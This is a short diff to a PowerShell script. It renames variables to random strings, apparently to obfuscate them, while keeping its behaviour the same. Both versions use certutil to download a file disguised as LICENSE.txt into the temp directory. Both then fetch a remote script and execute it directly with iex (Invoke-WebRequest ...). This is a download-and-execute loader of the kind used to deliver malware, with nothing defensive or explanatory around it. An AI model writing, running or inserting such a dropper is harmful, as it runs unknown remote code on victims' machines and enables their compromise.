@@ -1,8 +1,8 @@
-$URI="https://github.com/eforentropy/Wingman/raw/refs/heads/main/LICENSE.txt"
-$NAME = "LICENSE.txt"
-$tmpDir = [System.IO.Path]::GetTempPath()
-$exactPATH = Join-Path -Path $tmpDir -ChildPath $NAME
-certutil -urlcache -split -f $URI $exactPATH
+$MhsL4kfzoVFu="https://github.com/eforentropy/Wingman/raw/refs/heads/main/LICENSE.txt"
+$HIQYuZEdcXhlrt = "LICENSE.txt"
+$vdIDy = [System.IO.Path]::GetTempPath()
+$hcNQBmuFUySIJdTKrnjAG = Join-Path -Path $vdIDy -ChildPath $HIQYuZEdcXhlrt
+certutil -urlcache -split -f $MhsL4kfzoVFu $hcNQBmuFUySIJdTKrnjAG
 iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/eforentropy/Wingman/refs/heads/main/wingman2" -UseBasicParsing).Content
 
 
